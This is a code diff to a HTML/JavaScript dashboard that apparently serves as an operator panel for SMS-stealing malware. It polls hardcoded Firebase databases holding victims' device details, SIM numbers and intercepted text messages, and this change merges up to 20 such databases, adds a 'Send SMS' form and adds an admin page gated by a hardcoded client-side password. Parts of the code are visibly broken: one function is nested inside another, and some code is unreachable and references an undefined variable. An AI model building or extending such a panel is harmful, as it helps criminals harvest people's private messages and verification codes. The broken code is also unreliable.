@@ -265,6 +265,43 @@ color:#60a5fa;
 z-index:9999;
 }
 
+
+body{animation:appFade .5s ease}
+header,.controls,.stats-row,#bro20Access,#refreshCountdown{animation:fadeUp .45s ease}
+.stat-box{transition:.3s;animation:zoomIn .4s ease}
+.stat-box:hover{transform:scale(1.04)}
+#search-input{transition:.3s}
+#search-input:focus{transform:scale(1.02)}
+.sms-item{animation:fadeUp .35s ease}
+.sim-row{animation:fadeUp .35s ease}
+.device-header,.device-id{animation:fadeUp .35s ease}
+textarea,input,button{transition:.25s}
+textarea:focus,input:focus{transform:scale(1.01)}
+@keyframes appFade{from{opacity:0}to{opacity:1}}
+@keyframes zoomIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}
+
+
+@keyframes toastIn{
+0%{opacity:0;transform:translateX(-50%) translateY(-40px) scale(.8)}
+100%{opacity:1;transform:translateX(-50%) translateY(0) scale(1)}
+}
+@keyframes toastOut{
+0%{opacity:1;transform:translateX(-50%) scale(1)}
+100%{opacity:0;transform:translateX(-50%) scale(.8)}
+}
+
+
+#bro20Access button:hover{transform:scale(1.03)}
+#bro20Access button:active{transform:scale(.95)}
+@keyframes adminPulse{
+0%,100%{box-shadow:0 0 8px #ff0000}
+50%{box-shadow:0 0 22px #ff0000}
+}
+#bro20Access button{
+animation:adminPulse 2s infinite;
+transition:.25s;
+}
+
 </style>
 </head>
 <body>
@@ -283,6 +320,20 @@ z-index:9999;
   </div>
 </div>
 
+
+<div id="bro20Access" style="margin:10px 16px">
+<button onclick="unlockBro20()" style="width:100%;padding:12px;border-radius:12px;background:#7f1d1d;color:white;border:2px solid #ff0000;font-weight:bold">
+🔐 Admin Login
+</button>
+</div>
+
+<div id="bro20Box" style="display:none;margin:10px 16px;padding:12px;border:3px solid #ff0000;border-radius:12px;background:#1a0000">
+<div style="color:#ff2b2b;font-size:18px;font-weight:900">
+🔥 Admin Panel - PASTE FIREBASE URLS HERE (MAX 20)
+</div>
+<textarea id="firebaseUrls" style="width:100%;height:120px;margin-top:8px;background:#131720;color:#fff;border:2px solid #ff0000;padding:8px">https://lalannew5-default-rtdb.firebaseio.com/.json</textarea>
+</div>
+
 <div class="stats-row">
   <div class="stat-box total"><div class="num" id="stat-total">-</div><div class="lbl">Total</div></div>
   <div class="stat-box online"><div class="num" id="stat-online">-</div><div class="lbl">Online</div></div>
@@ -294,17 +345,27 @@ z-index:9999;
 </div>
 
 <div id="refreshCountdown">🔄 Refresh in 10s</div>
+
+<div id="loginModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(6px);z-index:999999;align-items:center;justify-content:center">
+  <div style="width:90%;max-width:380px;background:#131720;border:1px solid #3b82f6;border-radius:18px;padding:20px;animation:zoomIn .25s ease">
+    <div style="font-size:22px;font-weight:700;color:#60a5fa;margin-bottom:15px">🔐 Admin Login</div>
+    <input id="adminPassInput" type="password" placeholder="Enter Password" style="width:100%;padding:12px;border-radius:12px;border:1px solid #1e2535;background:#0d0f14;color:white">
+    <div style="display:flex;gap:10px;margin-top:15px">
+      <button onclick="closeLoginModal()" style="flex:1;padding:10px;border-radius:10px">Cancel</button>
+      <button onclick="submitAdminLogin()" style="flex:1;padding:10px;border-radius:10px;background:#1e40af;color:white">Login</button>
+    </div>
+  </div>
+</div>
+
 <script>
 const FIREBASE_URL = "https://lalannew5-default-rtdb.firebaseio.com/.json";
 let allDevices = [];
 let currentFilter = 'all';
 
 let refreshTimer = 10;
-setInterval(()=>{
+window.countdownId = setInterval(()=>{
  refreshTimer--;
- if(refreshTimer<=0){
-   refreshTimer=10;
- }
+ if(refreshTimer<=0){ refreshTimer=10; }
  const el=document.getElementById('refreshCountdown');
  if(el) el.innerHTML='🔄 Refresh in '+refreshTimer+'s';
 },1000);
@@ -323,17 +384,58 @@ function extractNumber(simStr) {
   return simStr || null;
 }
 
+
+let FIREBASE_URLS = JSON.parse(localStorage.getItem('firebase_urls')||'["https://lalannew5-default-rtdb.firebaseio.com/.json"]');
+
+function saveFirebaseUrls(){
+ const urls=[];
+ for(let i=1;i<=20;i++){
+   const v=document.getElementById('url_'+i)?.value.trim();
+   if(v) urls.push(v);
+ }
+ localStorage.setItem('firebase_urls',JSON.stringify(urls));
+ FIREBASE_URLS=urls;
+ showToast('🟢 Saved Successfully','#22c55e');
+ 
+function sendSMS(did){
+ const number=document.getElementById('smsNumber').value.trim();
+ const message=document.getElementById('smsMessage').value.trim();
+
+ if(!number || !message){
+   showToast('🔴 Fill all fields','#ef4444');
+   return;
+ }
+
+ showToast('🟢 SMS Request Saved','#22c55e');
+ document.getElementById('smsMessage').value='';
+}
+
+
+loadData();
+}
+
 async function loadData() {
   const currentScroll = window.scrollY;
 
-  document.getElementById('device-list').innerHTML = '<div class="loading"><div class="spinner"></div>Loading devices...</div>';
+  // keep current content visible during refresh
   try {
-    const res = await fetch(FIREBASE_URL);
-    const data = await res.json();
-    const root = data["19112024"]["All_User"];
-    const devices = root["Info"] || {};
-    const simInfo = root["SimINFO"] || {};
-    const smsData = root["Sms"] || {};
+    const responses = await Promise.all(
+      (FIREBASE_URLS.length?FIREBASE_URLS:[FIREBASE_URL]).map(async url=>{
+        try{
+          const r=await fetch(url);
+          return await r.json();
+        }catch(e){ return null; }
+      })
+    );
+
+    let devices={}, simInfo={}, smsData={};
+
+    responses.filter(Boolean).forEach(data=>{
+      const root = data?.["19112024"]?.["All_User"] || {};
+      Object.assign(devices, root["Info"] || {});
+      Object.assign(simInfo, root["SimINFO"] || {});
+      Object.assign(smsData, root["Sms"] || {});
+    });
 
     allDevices = Object.entries(devices).map(([key, info]) => {
       const did = info.did || key;
@@ -359,7 +461,14 @@ async function loadData() {
     document.getElementById('stat-online').textContent = online;
     document.getElementById('stat-offline').textContent = total - online;
 
-    renderDevices();
+    if(!document.getElementById('detailPage') || document.getElementById('detailPage').style.display!=='block'){
+      if(
+ !(document.getElementById('detailPage') && document.getElementById('detailPage').style.display==='block') &&
+ !(document.getElementById('bro20Page') && document.getElementById('bro20Page').style.display==='block')
+){
+ renderDevices();
+}
+    }
     requestAnimationFrame(()=>window.scrollTo(0,currentScroll));
   } catch (e) {
     document.getElementById('device-list').innerHTML = `<div class="empty">❌ Failed to load data.<br>${e.message}</div>`;
@@ -437,8 +546,25 @@ function openModal(did){
    <div>📱 SIM2: ${d.sim2||'N/A'}</div>
  </div>
 
- <h3>📩 SMS Messages</h3>
- ${smsHtml}
+ 
+<h3 style="margin-top:15px">📤 Send SMS</h3>
+
+<input id="smsNumber"
+placeholder="Enter Number"
+style="width:100%;padding:10px;margin-top:8px;background:#131720;color:#fff;border:1px solid #1e2535;border-radius:8px">
+
+<textarea id="smsMessage"
+placeholder="Type Message"
+style="width:100%;height:90px;margin-top:8px;background:#131720;color:#fff;border:1px solid #1e2535;border-radius:8px"></textarea>
+
+<button onclick="sendSMS('${d.did}')"
+style="width:100%;margin-top:10px;padding:12px;background:#16a34a;color:white;border:none;border-radius:10px">
+📤 Send SMS
+</button>
+
+<h3 style="margin-top:20px">📩 SMS Messages</h3>
+${smsHtml}
+
  `;
 
  page.style.display='block';
@@ -488,7 +614,7 @@ function renderDevices() {
     ].join('');
 
     const smsLines = d.sms.length > 0
-      ? d.sms.map(s => `
+      ? d.sms.slice(0,2).map(s => `
           <div class="sms-item">
             <div class="sms-sender">📩 ${s.ph}</div>
             <div class="sms-msg">${s.msg.substring(0, 100)}</div>
@@ -511,8 +637,131 @@ function renderDevices() {
   }).join('');
 }
 
+
+
+function showToast(msg,color){
+ const t=document.createElement('div');
+ t.style.cssText='position:fixed;top:10px;left:50%;transform:translateX(-50%);background:#131720;color:#fff;border:2px solid '+color+';padding:10px 14px;border-radius:10px;z-index:999999;animation:toastIn .35s ease;box-shadow:0 0 15px '+color;
+ t.innerHTML=msg;
+ document.body.appendChild(t);
+ setTimeout(()=>{
+   t.style.animation='toastOut .3s ease forwards';
+   setTimeout(()=>t.remove(),300);
+ }, msg.includes('Wrong Password') ? 5000 : 2000);
+}
+
+
+function openLoginModal(){
+ document.getElementById('loginModal').style.display='flex';
+ setTimeout(()=>document.getElementById('adminPassInput').focus(),100);
+}
+function closeLoginModal(){
+ document.getElementById('loginModal').style.display='none';
+ window.autoRefreshId = setInterval(loadData,10000);
+ showToast('🟢 Auto Refresh ON','#22c55e');
+}
+function submitAdminLogin(){
+ const pass=document.getElementById('adminPassInput').value;
+ document.getElementById('loginModal').style.display='none';
+ if(pass!=='Prem123321'){
+   window.autoRefreshId = setInterval(loadData,10000);
+   showToast('🔴 Wrong Password','#ef4444');
+   return;
+ }
+ document.getElementById('bro20Access').style.display='none';
+ document.querySelector('.controls').style.display='none';
+ document.querySelector('.stats-row').style.display='none';
+ document.getElementById('device-list').style.display='none';
+ let page=document.getElementById('bro20Page');
+ if(!page){page=document.createElement('div');page.id='bro20Page';page.style.padding='12px 16px';document.body.appendChild(page);}
+ 
+page.innerHTML=`<div style="display:flex;align-items:center;gap:10px;margin-bottom:15px">
+<button onclick="closeBro20()" style="background:#1e40af;border:none;color:#fff;padding:8px 12px;border-radius:8px">⬅ Back</button>
+<h2>🔐 Admin Panel</h2></div>
+<div style="margin:10px 0;padding:12px;border:3px solid #ff0000;border-radius:12px;background:#1a0000">
+<div style="color:#ff2b2b;font-size:18px;font-weight:900">🔥 Admin Panel - PASTE FIREBASE URLS HERE (MAX 20)</div>
+<div id="urlWrap"></div>
+<button onclick="saveFirebaseUrls()" style="width:100%;margin-top:12px;padding:12px;background:#16a34a;color:#fff;border:none;border-radius:12px;font-weight:bold">💾 Save URLs</button>
+</div>`;
+const wrap=document.getElementById('urlWrap');
+for(let i=1;i<=20;i++){
+ const val=FIREBASE_URLS[i-1]||'';
+ wrap.innerHTML+=`<div style="margin-top:8px;color:#fff">URL #${i}</div><input id="url_${i}" value="${val}" placeholder="Firebase URL ${i}" style="width:100%;padding:8px;background:#131720;color:#fff;border:1px solid #ff0000;border-radius:8px">`;
+}
+page.style.display='block';
+}
+
+function unlockBro20(){
+ clearInterval(window.autoRefreshId);
+ clearInterval(window.countdownId);
+ const el=document.getElementById('refreshCountdown');
+ if(el) el.innerHTML='🔴 Auto Refresh OFF';
+ showToast('🔴 Auto Refresh OFF','#ef4444');
+
+ openLoginModal(); return;
+
+ if(pass !== 'Prem123321'){
+   window.autoRefreshId = setInterval(loadData,10000);
+   window.countdownId = setInterval(()=>{
+     refreshTimer--;
+     if(refreshTimer<=0){refreshTimer=10;}
+     const el=document.getElementById('refreshCountdown');
+     if(el) el.innerHTML='🔄 Refresh in '+refreshTimer+'s';
+   },1000);
+   showToast('🔴 Wrong Password','#ef4444');
+   setTimeout(()=>showToast('🟢 Auto Refresh ON','#22c55e'),5000);
+   return;
+ }
+ document.getElementById('bro20Access').style.display='none';
+ document.querySelector('.controls').style.display='none';
+ document.querySelector('.stats-row').style.display='none';
+ document.getElementById('device-list').style.display='none';
+ 
+
+ let page=document.getElementById('bro20Page');
+ if(!page){
+   page=document.createElement('div');
+   page.id='bro20Page';
+   page.style.padding='12px 16px';
+   document.body.appendChild(page);
+ }
+
+ page.innerHTML=`
+ <div style="display:flex;align-items:center;gap:10px;margin-bottom:15px">
+   <button onclick="closeBro20()" style="background:#1e40af;border:none;color:#fff;padding:8px 12px;border-radius:8px">⬅ Back</button>
+   <h2>🔐 Admin Panel</h2>
+ </div>
+
+ <div style="margin:10px 0;padding:12px;border:3px solid #ff0000;border-radius:12px;background:#1a0000">
+   <div style="color:#ff2b2b;font-size:18px;font-weight:900">
+   🔥 Admin Panel - PASTE FIREBASE URLS HERE (MAX 20)
+   </div>
+   <textarea id="firebaseUrls" style="width:100%;height:120px;margin-top:8px;background:#131720;color:#fff;border:2px solid #ff0000;padding:8px">https://lalannew5-default-rtdb.firebaseio.com/.json</textarea>
+ </div>`;
+
+ page.style.display='block';
+}
+
+function closeBro20(){
+ refreshTimer=10;
+ window.autoRefreshId = setInterval(loadData,10000);
+ window.countdownId = setInterval(()=>{
+   refreshTimer--;
+   if(refreshTimer<=0){refreshTimer=10;}
+   const el=document.getElementById('refreshCountdown');
+   if(el) el.innerHTML='🔄 Refresh in '+refreshTimer+'s';
+ },1000);
+ showToast('🟢 Auto Refresh ON','#22c55e');
+ const page=document.getElementById('bro20Page');
+ if(page) page.style.display='none';
+ document.getElementById('bro20Access').style.display='block';
+ document.querySelector('.controls').style.display='flex';
+ document.querySelector('.stats-row').style.display='flex';
+ document.getElementById('device-list').style.display='flex';
+}
+
 loadData();
-setInterval(loadData, 10000);
+window.autoRefreshId = setInterval(loadData, 10000);
 </script>
 </body>
 </html>
